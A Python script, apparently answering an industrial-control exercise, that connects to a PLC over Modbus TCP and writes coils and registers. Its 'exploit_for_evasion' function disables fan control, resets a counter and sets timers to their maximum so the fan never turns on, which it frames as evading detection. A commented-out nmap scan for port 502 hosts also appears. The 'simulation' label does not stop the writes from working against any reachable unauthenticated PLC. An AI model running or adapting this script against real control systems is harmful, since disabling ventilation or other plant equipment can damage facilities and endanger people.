# Requires:
# - pymodbus library: pip install pymodbus
# - PLC's IP address and Modbus configuration (as provided in the problem)
# - Assumes Modbus TCP is enabled on the PLC and accessible from the Windows machine.
# - Assumes the PLC program has a vulnerability exploitable via Modbus register modification.  This is a *simulated* vulnerability, as the provided program has no readily apparent buffer overflows or similar.  A real attack would require discovering and leveraging a specific flaw.

import time
from pymodbus.client import ModbusTcpClient

# --- Configuration ---
PLC_IP = "192.168.9.24"  # From the problem description
MODBUS_PORT = 502       # Standard Modbus port
M_TOG_ADDRESS = 2       # %M2, used in Rung 1
M_ACTFAN_ADDRESS = 1    # %M1, used in Rung 0 and Rung 1
Q_FAN_ADDRESS = 0       # %Q0.0, Fan output
Q_REDA_ADDRESS = 4       # %Q0.4, FanA Red LED
Q_GREENA_ADDRESS = 5     # %Q0.5, FanA Green LED
COUNTER0_ADDRESS = 16    # %C0, Count value
TIMER0_ADDRESS = 100 #%TM0, Timer Pulse 
TIMER1_ADDRESS = 102 #%TM1, Timer ON

def find_plc_ip_address():
    """
    This function *simulates* finding the PLC's IP address. In a real scenario,
    you might use network scanning tools (e.g., nmap) or query a central management
    system to discover the PLC's IP.  This implementation *returns the predefined IP*.

    Returns:
        str: The PLC's IP address.
    """
    # In a real-world scenario, implement network scanning or querying to find the PLC's IP.
    # For example, using nmap from Python:
    # import nmap
    # nm = nmap.PortScanner()
    # nm.scan(subnet, arguments='-p 502')  # Scan for Modbus (port 502)
    # for host in nm.all_hosts():
    #   if 'modbus' in nm[host]['tcp']:
    #      return host

    return PLC_IP

def exploit_for_evasion(client):
    """
    Simulates exploiting a vulnerability for evasion.  This example focuses on
    manipulating the PLC program logic to disable the fan control in a way that
    might avoid simple detection.  This is a simplified example; a real
    exploit would likely be far more complex and target a specific, discovered flaw.

    Args:
        client: A ModbusTcpClient instance connected to the PLC.
    """

    print("[+] Attempting exploitation for evasion...")

    # *** IMPORTANT: This is a SIMULATION. A real attack would require a *real* vulnerability. ***

    # Strategy:
    # 1. Disable the fan by setting M_TOG to TRUE. This should prevent the fan from turning ON even if M_ACTFAN is TRUE. This could be useful if an operator would need to manually override fan settings.
    # 2. Reset the counter to its initial value. By resetting the counter, we're trying to manipulate the number of times the fan tries to turn on. The system would only activate the fan if the counter reaches the preset value.
    # 3. Change timer value for TIMER0 (%TM0) and TIMER1 (%TM1) to a maximum value to never be true.
    
    try:
        # Disable fan control logic
        print("[+] Setting M_TOG (Toggle Off) to TRUE to disable fan control.")
        client.write_coil(M_TOG_ADDRESS, True)
        time.sleep(0.1)

        # Reset the counter
        print("[+] Resetting Counter0 to 0.")
        client.write_register(COUNTER0_ADDRESS, 0) # Reset Counter0 value
        time.sleep(0.1)
        
        # Increase timers to max
        print("[+] Setting Timers to a max value.")
        client.write_register(TIMER0_ADDRESS, 32767)
        client.write_register(TIMER1_ADDRESS, 32767)
        time.sleep(0.1)

        print("[+] Exploitation steps completed. Fan control logic has been manipulated.")

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")


if __name__ == "__main__":
    # 1. Discover PLC IP (Simulated)
    plc_ip = find_plc_ip_address()
    print(f"[+] PLC IP Address: {plc_ip}")

    # 2. Connect to the PLC
    client = ModbusTcpClient(plc_ip, port=MODBUS_PORT)

    try:
        if client.connect():
            print("[+] Successfully connected to the PLC.")

            # 3. Execute the Exploit
            exploit_for_evasion(client)

        else:
            print("[!] Failed to connect to the PLC.")

    except Exception as e:
        print(f"[!] An error occurred: {e}")

    finally:
        client.close()
        print("[+] Connection closed.")